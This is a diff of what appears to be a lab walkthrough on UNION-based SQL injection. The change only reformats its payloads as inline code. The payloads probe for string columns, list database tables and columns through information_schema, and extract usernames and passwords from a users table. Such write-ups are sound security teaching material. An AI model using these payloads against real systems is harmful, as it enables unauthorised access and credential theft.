@@ -24,13 +24,13 @@ SQL injection (SQLi) is a web security vulnerability that allows an attacker to 
 ### 3. Identifying a Column with a Useful Data Type
 
 - **Action**: Submit the following payload to identify a column that can hold string data:
-' UNION SELECT 'abc', NULL --
+   `' UNION SELECT 'abc', NULL --`
 - **Observation**: The application returns the string `'abc'` in the response, indicating that the first column can hold string data.
 
 ### 4. Listing the Tables in the Database
 
 - **Action**: Submit the following payload to retrieve the list of tables in the database:
-'UNION+SELECT+table_name,null+from+information_schema.tables--
+  `'UNION+SELECT+table_name,null+from+information_schema.tables--`
 - **Observation**: The application returns the list of table names in the response.
 
 ### 5. Identifying the Table Containing User Credentials
@@ -40,13 +40,13 @@ SQL injection (SQLi) is a web security vulnerability that allows an attacker to 
 ### 6. Listing the Columns in the User Table
 
 - **Action**: Submit the following payload to retrieve the list of columns in the identified user table:
-'UNION+SELECT+column_name,null+from+information_schema.columns+where+table_name%3d'users_fbihjt'--
+   `'UNION+SELECT+column_name,null+from+information_schema.columns+where+table_name%3d'users_fbihjt'--`
 - **Observation**: The application returns the list of column names in the response.
 
 ### 7. Retrieving the Usernames and Passwords
 
 - **Action**: Submit the following payload to retrieve the usernames and passwords from the user table:
-'UNION+SELECT+username_wokopc,password_kwjcxb+from+users_fbihjt--
+   `'UNION+SELECT+username_wokopc,password_kwjcxb+from+users_fbihjt--`
 - **Observation**: The application returns the usernames and passwords in the response.
 
 ## 🧠 Key Takeaways
